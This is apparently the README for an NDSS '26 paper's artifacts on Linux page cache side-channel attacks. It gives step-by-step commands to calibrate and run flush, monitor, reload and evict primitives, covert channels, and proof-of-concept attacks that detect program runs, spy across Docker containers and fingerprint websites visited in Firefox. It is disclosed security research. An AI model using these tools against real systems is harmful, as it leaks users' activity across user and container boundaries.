# Eviction Notice: Reviving and Advancing Page Cache Attacks - Artifacts
This repository contains the artifacts for the paper "Eviction Notice: Reviving
and Advancing Page Cache Attacks", accepted at [NDSS
'26](https://www.ndss-symposium.org/ndss2026/). The paper can be found here:
https://snee.la/pubs/eviction-notice.pdf.

The artifact is at: https://zenodo.org/records/17915256

### Table Of Contents
* [ Introduction ](#introduction)
    * [ Requirements ](#requirements)
    * [ Setting Up ](#setting-up)
* [ Calibration ](#calibration)
* [ Primitives ](#primitives)
    * [ Flush ](#flush)
    * [ Monitor ](#monitor)
    * [ Reload ](#reload)
        * [ Bypassing Read-Ahead: Backward Reading
          ](#bypassing-read-ahead-backward-reading)
        * [ Bypassing Read-Ahead: The readahead Syscall
          ](#bypassing-read-ahead-the-readahead-syscall)
    * [ Evict ](#evict)
* [ Reload Mechanisms ](#reload-mechanisms)
* [ Covert Channel ](#covert-channels)
    * [ Flush+Monitor ](#flushmonitor)
    * [ Flush+Reload ](#flushreload)
    * [ Flush+Flush ](#flushflush)
* [ Attacks: Proof of Concept ](#attacks-proof-of-concepts)
    * [ Detecting Programs ](#detecting-programs)
    * [ Cross-Docker-Container ](#cross-docker-container)
    * [ Website Fingerprinting ](#website-fingerprinting)

## Introduction
Page cache attacks (Gruss *et al.*, CCS 2019) have been thought to be mititgated
or impractically slow (Schwarzl *et al.*, 2023) since the mitigation of mincore
in 2019. In this paper, we not only revive practical attacks on the page cache,
but also provide a systematic classification & understanding of primitives which
interact with page cache. This understanding helps us advance page cache
attacks, including speeding up previously known mechanisms by six orders of
magnitude.

This artifact contains:
1. `primitives/`: Code implementing the four primitives: flush, monitor, reload,
   and evict,
2. `reload-mechanisms/`: Proof-of-concept code demonstrating the 11 syscalls
   identifed as reload mechanisms,
3. `covert-channels/`: Three covert channels, and
4. `attacks/`: Three proof-of-concept attacks.

### Requirements
Our research was tested on Debian-based Linux systems with an ext4 file system.
This artifact was developed on an Ubuntu 22.04 LTS and further verified on a
Debian 13 system. Although our attacks *should* work on most Linux
distributions, distro-specific idiosyncrasies might make it challenging to
completely mount attacks in the exact manner described in this artifact. The underlying primitives, however, *should* work.

We also tested our attacks on ext2, ext3, btrfs, & ntfs, and confirmed that our
mechanisms work on these systems; however, we have not tested anything more on
these filesystems. Kernel versions above 4.14 should be enough to demonstrate
all proof-of-concept attacks.

Kernel version requirements for syscalls:
- flush (`POSIX_FADVISE` + `POSIX_FADV_DONTNEED`): >
  [2.6.5](https://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.5)
- monitor (`preadv2` + `RWF_NOWAIT`): >
  [4.14](https://kernelnewbies.org/Linux_4.14#Asynchronous_buffered_I.2FO_support)
- monitor (`cachestat`): >
  [6.5](https://www.kernel.org/pub/linux/kernel/v6.x/ChangeLog-6.5)<sup>*</sup>

In early 2025, the `cachestat` syscall was
[mitigated](https://lore.kernel.org/linux-cve-announce/2025021055-CVE-2025-21691-2bd2@gregkh/)
following our responsible disclosure. It appears this mitigation was introduced
in various patches of each distribution. The [Debian security
tracker](https://security-tracker.debian.org/tracker/CVE-2025-21691/) contains
links to other distributions' handling of the mitigation. In Ubuntu 22.04.1, the
mitigation appears to be introduced somewhere around patch version
[62-65](https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/jammy/commit/?h=Ubuntu-hwe-6.8-6.8.0-62.65_22.04.1)
and Ubuntu states to have fixed in it
[6.8.0-64.67~22.04.1](https://ubuntu.com/security/CVE-2025-21691); so kernels
between 6.8.0 to 6.8.0-64 in Ubuntu 22.04 should support the non-mitigated
version `cachestat` as we demonstrate in the paper.

It is still possible to demonstrate the usage of `cachestat`, although not in a
cross-user threat model as we describe in the paper. The `cachestat` syscall
works for same-user demonstrations. Regardless, it is still possible to use the
`preadv2 + RWF_NOWAIT` as an alternative to `cachestat`, which we confirm works
at the time of writing. 

glibc >= 2.34 is required.

For demonstrating cross-container attacks, the only additional piece of software
required is Docker.

### Setting Up
Most PoCs require a file. We recommend generating a file that's at least 64
pages large in `/tmp/` using the script `helper-scripts/create-testing-file.sh`.
This shell script creates `/tmp/ndss26-fallae-2.bin`.

**Note:** Systems with /tmp/ mounted as a tmpfs (ex: Arch Linux) will not be
able to perform attacks on the file in /tmp/ as it does not get flushed to disk.
Please generate the file at a different path for the remainder of this artifact.
We suggest a system-wide file at `/var/opt/`. This file should be readable.

Validate the permissions on the temporary file (readable by user, group, and
other): `ls -la /tmp/ndss26-fallae-2.bin`

Since the attacks in our paper are cross-user, here is a command to create a new
user (requires root): `adduser testinguser` (set a simple password and the rest
can be skipped)

To clean up (requires root): `deluser --remove-home testinguser`

All commands to be run by testinguser will be explicitly mentioned. Otherwise,
commands are to be run by the normal user (an already existing user).

## Calibration
Three primitives - flush, reload (read bypass backward reading), and reload
(read bypass readahead) - require a threshold value which is system dependent.
With an Intel CPU with P-Cores and E-Cores, it may be beneficial to taskset all
commands to one set of cores for the remainder of the evaluation: all commands
should be prefixed with `taskset -c 0,1` if the P-Cores are cores 0 and 1. On
laptops, make sure the computer is plugged in and set to performance mode for
the least variability in values.

In `calibration/`, run `make` to compile the three programs.

Afterwards, run each of the programs a few times and determine a good threshold
value. There may be outliers for the first runs; therefore, choose a value that
often appears.

```sh
# Run 5 times and note a reasonable FLUSH_THRESHOLD
./build/calibrate-flush /tmp/ndss26-fallae-2.bin

# Run 5 times and note a reasonable READ_THRESHOLD
./build/read-bypass-backward-reading /tmp/ndss26-fallae-2.bin

# Run 5 times and note a reasonable READAHEAD_THRESHOLD
./build/read-bypass-readahead /tmp/ndss26-fallae-2.bin
```

Place these values in the "configure me" part of `primitives/Makefile`.

## Primitives

The `primitives/Makefile` should now be configured with the selected thresholds.
In `primitives/`, run `make`. This compiles flush, monitor, reload, and evict
mechanisms into `primitives/build/`.

Copy build and scripts to `/tmp/` and switch to the newly-created user.

```sh
cp -r build /tmp/build-primitives
cp -r scripts/ /tmp/build-primitives/

su testinguser

# [testinguser]
cd /tmp/
```

### Flush
From the paper, "flush is an unprivileged and deterministic primitive that
removes pages from the page cache".

First, we bring the entire file into the page cache by reading the whole file:

```sh
# [testinguser]
./build-primitives/read /tmp/ndss26-fallae-2.bin -1 # -1 means the whole file
```

Second, we flush the entire file. The `cache` field of each page should report
1, *i.e.* all pages should be in cache, as it takes a long time to execute the
syscall:

```sh
# [testinguser]
./build-primitives/flush /tmp/ndss26-fallae-2.bin -1
```

Finally, we flush the entire file once again. Note the `cache` field of each
page should now report 0, *i.e.* all pages should no longer be in cache because
we just flushed it, and it takes a short amount of time to execute the syscall:

```sh
# [testinguser]
./build-primitives/flush /tmp/ndss26-fallae-2.bin -1
```

### Monitor
From the paper, "Monitor [...] reports the presence of a page in the page cache
without bringing it into memory if it is not present". On kernel versions above
6.5, [the `cachestat`
syscall](https://www.phoronix.com/news/Linux-6.5-MM-cachestat) can be used. As
mentioned in [requirements](#requirements) above, `cachestat` may not work in a
cross-user setting and may get a permission denied. If that's the case,
`preadv2` (discussed below) works.

Monitor does not require timing measurements.

```sh
# [testinguser]: All commands
# 1. Reload the whole file
./build-primitives/read /tmp/ndss26-fallae-2.bin -1

# 2. Monitor should report all pages in cache
./build-primitives/monitor-cachestat /tmp/ndss26-fallae-2.bin -1

# 3. Flush the whole file
./build-primitives/flush /tmp/ndss26-fallae-2.bin -1

# 4. Monitor should report all pages not in cache
./build-primitives/monitor-cachestat /tmp/ndss26-fallae-2.bin -1
```

It's possible to work around this limitation by installing an older, unpatched
kernel, or by using the `preadv2` syscall:

```sh
# [testinguser]: All commands
# 1. Reload the whole file
./build-primitives/read /tmp/ndss26-fallae-2.bin -1

# 2. Monitor should report all pages in cache
./build-primitives/monitor-preadv2 /tmp/ndss26-fallae-2.bin -1

# 3. Flush the whole file
./build-primitives/flush /tmp/ndss26-fallae-2.bin -1

# 4. Monitor should report all pages not in cache
./build-primitives/monitor-preadv2 /tmp/ndss26-fallae-2.bin -1
```

### Reload
From the paper, "The reload primitive determines whether a page is present in
the page cache by measuring the time it takes a process to read a page". A big
limitation with reloading page-by-page is the read-ahead mechanism: "As an
optimization to increase performance, Linux, by default, reads upto 32 pages
ahead upon any file access".

After flushing the entire file, reading the file page-by-page should indicate
that all pages are not in cache. However, we notice the first few pages take a
long time to be reloaded (*i.e.*, not in cache) and subsequent pages take far
less time to be reloaded (*i.e.*, in cache).

```sh
# [testinguser]: All commands
# 1. Flush the whole file
./build-primitives/flush /tmp/ndss26-fallae-2.bin -1

# 2. Reload the file using read
./build-primitives/read /tmp/ndss26-fallae-2.bin -1
```

We present two methods to bypass this read-ahead mechanism.

#### Bypassing Read-Ahead: Backward Reading
The first and more reliable method to bypass the read-ahead mechanism is to read
the file *backward*. Determining whether pages are in the page cache should now
be reliable.

```sh
# [testinguser]: All commands
# 1. Flush the whole file
./build-primitives/flush /tmp/ndss26-fallae-2.bin -1

# 2. Reload the file using backward reading
./build-primitives/read-bypass-backward-reading /tmp/ndss26-fallae-2.bin -1

# 3. Reload the file once again using backward reading (should now be in cache)
./build-primitives/read-bypass-backward-reading /tmp/ndss26-fallae-2.bin -1
```

#### Bypassing Read-Ahead: The readahead Syscall
The second and less reliable method to bypass the read-ahead mechanism is by
employing the `readahead` syscall, "an explicit request to the read-ahead
mechanism to bring [exact] pages from disk".

```sh
# [testinguser]: All commands
# 1. Flush the whole file
./build-primitives/flush /tmp/ndss26-fallae-2.bin -1

# 2. Reload the file using readahead
./build-primitives/read-bypass-readahead /tmp/ndss26-fallae-2.bin -1

# 3. Reload the file once again using readahead (should now be in cache)
./build-primitives/read-bypass-readahead /tmp/ndss26-fallae-2.bin -1
```

### Evict

**WARNING**: This may slow your system down, freeze, or even crash it! Stability
largely depends on how aggressive (fast) you employ eviction. Please close all
applications before you try evaluate eviction. Ensure swapping is off!

In one terminal, open `htop -d 1` or any monitoring program which reports memory
usage. In another terminal (as testinguser), bring the file to page cache before
starting the `auto-kill-evict.sh`:

```sh
# [testinguser]: All commands
# 1. Bring the file to page cache
./build-primitives/read /tmp/ndss26-fallae-2.bin -1

# 2. Monitor should report all pages in cache
./build-primitives/monitor-preadv2 /tmp/ndss26-fallae-2.bin -1

# 3. Start the auto-kill-evict script which kills all eviction programs once the
#    file is out of page cache (uses monitor with preadv2)
./build-primitives/scripts/auto-kill-evict.sh /tmp/ndss26-fallae-2.bin
```

With evict-3-baseline, we apply a baseline pressure by reducing free memory to
1/8 of available memory; we allocate a large amount of memory and `mlock` it.
Since `mlock` can lock up to 1/8 of total memory ([on Debian & Debian-based
systems](https://github.com/systemd/systemd/commit/04d1ee0f7ec7a280136ddf5f3f34d6282a50846d)),
we spawn 7 baseline pressure programs locking 1/8 _available_ memory, leaving
the remaining 1/8 for the three other eviction programs.

Different systems with different mlock limits (check with `ulimit -l` or `ulimit
-a`) may require tweaking mlock limits (requires root).

This command tells a sane value to use with `evict-3-baseline`:

```sh
echo "scale=1; $(grep MemAvailable /proc/meminfo | awk '{print $2}') / (8 * 1000 * 1000)" | bc
```

In a new terminal (as testinguser), begin the process of eviction, replacing the
`<BASELINE_HERE>` with the number computed above. This computed number can be
made lower for eviction to be less aggressive.

```sh
# [testinguser]: All commands
# Eviction set 3
for ((i=0; i<7; ++i)); do
    ./build-primitives/evict-3-baseline <BASELINE_HERE> &
    sleep 0.5
done

# Eviction set 1, iterate over all shared libraries
./build-primitives/evict-1-shlibs $(./build-primitives/scripts/list-all-shlibs.sh) &

# Eviction set 2, access all readable files on the system 
./build-primitives/evict-2-randaccess &

# Eviction set 4, dynamically apply pressure by allocating 64 MiB chunks
./build-primitives/evict-4-dynpressure &
```

When `auto-kill-evict.sh` reports "Killed all eviction programs...", the file
has been evicted. Validate this with monitor:

```sh
# [testinguser]
# 1. Monitor should report all pages are no longer in cache
./build-primitives/monitor-preadv2 /tmp/ndss26-fallae-2.bin -1
```

## Reload Mechanisms
There are 11 syscalls / methods that behave as reload mechanisms. These are
outline in Table 1 of the paper. In `reload-mechanisms/`, run `make`. Once all
11 files have been compiled (plus `silent-flush.c`), run `test-all-reload.sh`
(you don't need to be testinguser). This script tests all the reload mechanisms:
- starting with a flush
- reloading (slow, not in page cache)
- reloading (fast, in page cache) 

## Covert Channels
We demonstrate three covert channels: Flush+Monitor, Flush+Reload, Flush+Flush.
First, set the FLUSH_THRESHOLD in `covert-channels/flush-flush/Makefile` and
READ_THRESHOLD in `covert-channels/flush-reload/Makefile`. These are determined
from [calibration](#calibration) and were set in the Makefile in
[primitives](#primitives).

Afterwards, run `make` in all three directories. This results in three build
directories: `build-cc-fm`, `build-cc-fr`, and `build-cc-ff`. Copy these three
to `/tmp/covert-channels/`:

```sh
mkdir /tmp/covert-channels

# In covert-channels/flush-monitor:
cp -r build-cc-fm /tmp/covert-channels

# In covert-channels/flush-reload:
cp -r build-cc-fr /tmp/covert-channels

# In covert-channels/flush-flush:
cp -r build-cc-ff /tmp/covert-channels
```

We create two files for the covert channels, one for transmission and the other
for synchronization:

```sh
dd if=/dev/urandom of=/tmp/covert-channels/sync_file bs=1K count=64
dd if=/dev/urandom of=/tmp/covert-channels/comms_file bs=1M count=512
```

For each of the three covert channels, the receiver runs first to flush the
`comms_file` from the page cache. Afterwards, the sender uses reload on
`comms_file` with backward reading to bring pages into the cache. Following the
transmission, the sender signals to the receiver via the `sync_file` to start
receiving. Finally, the receiver uses either monitor, reload, or flush on the
`comms_file` to determine the final message.

To compare the received message to the original transmitted message, the sender
writes the transmission to `message.txt`. Therefore, the sender requires write
permissions in that directory. The receiver reads this file once completed,
computes the percentage of correctly received bits.

### Flush+Monitor
Flush+Monitor Covert Channel:

```sh
# [testinguser]
cd /tmp/covert-channels/
# cachestat can also be used instead of preadv2
./build-cc-fm/receiver-preadv2 ./comms_file ./sync_file ./message.txt

# wait for 1-2 seconds

# [normal user]
cd /tmp/covert-channels/
./build-cc-fm/sender ./comms_file ./sync_file ./message.txt
```

### Flush+Reload
Flush+Reload Covert Channel:

```sh
# [testinguser]
cd /tmp/covert-channels/
# This may take up to some time to run, depending on disk and processor
# (12 seconds on AMD Zen 3 with SSD)
./build-cc-fr/receiver ./comms_file ./sync_file ./message.txt

# wait for 1-2 seconds

# [normal user]
cd /tmp/covert-channels/
./build-cc-fr/sender ./comms_file ./sync_file ./message.txt
```

### Flush+Flush
The Flush+Flush Covert Channel is the most tricky to function with a low error
rate as the time difference between flushing a page in cache versus a page not
in cache is SUPER close. Furthermore, flush timing is _extremely_(!) sensitive
to system activity.

As such, here are a few suggestions to _try_ boosting its accuracy. We
consistently see our covert channel perform above 99% correct transmitted bits
with the first two tricks:

1. `taskset` both the sender and the receiver to different physical cores (same
   core complex).
2. Reduce the size of the comms_file. 512 MiB works fine on our AMD Zen 3
   machine with an SSD, but other testing machines may require less (128 MiB).
3. Tweak the FLUSH_THRESHOLD value if the receiver is already beginning to
   record data before the sender even starts transmitting.

NOTE: The prints are deliberate! On our system, we notice the print makes timing
more concise (other tricks perform worse, such as sched_yield, usleeps...).

```sh
# [testinguser]
cd /tmp/covert-channels/
./build-cc-ff/receiver ./comms_file ../sync_file ./message.txt

# wait for 1-2 seconds

# [normal user]
cd /tmp/covert-channels/
./build-cc-ff/sender ../comms_file ../sync_file ./message.txt
```

## Attacks: Proof of Concepts
We present three of the attacks we demonstrate in the paper as proof of
concepts.

### Detecting Programs
We detect whether `htop` has been executed. First, ensure there are no `htop`s
already running: `pkill htop`. Second, ensure the output of `which htop`
succeeds with a path (and is not aliased). Finally, we use the flush and monitor
primitives earlier compiled to detect `htop`.

As testinguser:
```sh
# [testinguser]: All commands
# Flush htop
/tmp/build-primitives/flush $(which htop) -1

# Monitor htop
while true; do
    /tmp/build-primitives/monitor-preadv2 $(which htop) -1 | grep "In cache"
done
```

In another shell as normal user, run `htop`. The while loop should now report
that `htop` is in cache.

### Cross-Docker-Container
In `attacks/docker/`, there are two folders: provoker and watcher. Watcher
contains code for a Flush+Reload program. In both `provoker/` and `watcher/`,
run `docker compose up`. This will build two images `ndss26-fallae-2-provoker`
and `ndss26-fallae-2-watcher` from ubuntu:jammy. It will also install oh-my-zsh.

Once both images are built, run these two commands:

```sh
# In terminal 1
docker run -it ndss26-fallae-2-watcher:latest
ls -l
./watcher /usr/bin/ls 4 # Watching only page 4

# In terminal 2
docker run -it ndss26-fallae-2-provoker:latest
# wait for a few seconds
ls
```

Whenever `ls` is run in terminal 2 (provoker), the watcher program in terminal 1
should see it reload faster, *i.e.* cached.

### Website Fingerprinting
With this attack, we aim to show the difference in total number of cached pages
for a few websites. With snap versions of Firefox on Ubuntu being challenging to
deal with, we recommend using a non-snap version of Firefox. If Firefox is
already installed with apt, find the path of `libxul.so` (you can use the
plocate command to help): it most likely will be `/usr/lib/firefox/libxul.so`.

Download a non-snap version of Firefox from Mozilla's PPA:
https://ppa.launchpadcontent.net/mozillateam/ppa/ubuntu/pool/main/f/firefox/.
The package to be downloaded should be all the way at the bottom, and it should
look like: firefox_1XX.0.4+build1-0ubuntu0.22.04.1~mt1_amd64.deb. The file size
should be > 50-ish MB. **DON'T** download a locale version.

Once downloaded, extract the file: `ar x firefox_....deb`. Afterwards, extract
`data.tar.zst`: `tar -xf data.tar.zst`. In the newly extracted data folder, edit
`data/usr/lib/firefox/firefox.sh` to change the path of `MOZ_LIBDIR` to the full
path of the directory in which the `firefox.sh` is present. This directory
should also contain `libxul.so`. This path is required for the attack.

With this, we now have a local version of firefox that can be launched via:
`./firefox.sh`.

In `attacks/website-fingerprinting`, run `make` to compile the flush-monitor
program, which uses preadv2. For simplicity, you can be normal user to evaluate:

```sh
./flush-monitor /path/to/libxul.so # earlier noted with the firefox.sh
```

In the locally-launched firefox, visit a few websites (one at a time) to see a
difference in usage of libxul's pages. Try openai, twitch, reddit, wikipedia,
youtube, hackernews.